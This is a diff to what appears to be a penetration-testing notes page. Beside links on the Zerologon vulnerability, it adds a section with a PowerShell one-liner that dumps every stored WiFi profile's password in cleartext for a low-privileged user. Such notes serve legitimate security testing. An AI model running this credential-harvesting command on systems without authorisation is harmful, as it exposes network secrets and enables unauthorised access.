@@ -3,3 +3,8 @@
 <p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472</a>.</p>
 <p><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a>.</p>
 <p><a href="https://www.secura.com/blog/zero-logon">https://www.secura.com/blog/zero-logon</a>.</p>
+
+<h1>WiFi</h1>
+<h2>Read stored WiFi passwords as low privileged user</h2>
+<p>(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize</p>
+
